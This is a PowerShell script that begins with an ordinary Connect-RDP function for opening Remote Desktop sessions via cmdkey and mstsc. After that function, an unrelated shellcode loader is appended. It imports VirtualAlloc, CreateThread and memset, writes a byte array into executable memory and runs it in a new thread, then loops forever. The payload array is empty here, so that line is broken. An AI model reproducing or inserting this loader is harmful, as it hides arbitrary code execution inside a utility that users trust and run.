

function Connect-RDP{



	param (
        [parameter(Mandatory=$true)]
        [string[]]$Name
	)
    
    
    
    
    if ((Get-Command "cmdkey") -and (Get-Command "mstsc")){ 
    
        
        
        $Servers = Get-RemoteConnection -Name $Name
       
        if(!(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse)){
        
            Write-Host "Copy $($PStemplates.RDP.Name) file to the config folder"        
    		Copy-Item -Path $PStemplates.RDP.FullName -Destination (Join-Path -Path $PSconfigs.Path -ChildPath $PStemplates.RDP.Name)
    	} 
		$RDPDefaultFile = $(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse).Fullname		

        foreach($Server in $Servers){
		        
            $Servername = $Server.Name
            $Username = $Server.User

            
            $Null = Invoke-Expression "cmdkey /delete:'$Servername'"

            
            $Null = Invoke-Expression "cmdkey /generic:'$Servername' /user:'$Username'"

            
            Invoke-Expression "mstsc '$RDPDefaultFile' /v:$Servername"
	    }
    }
}

$DoZ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $DoZ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$96h=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($96h.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$96h,0,0,0);for (;;){Start-sleep 60};

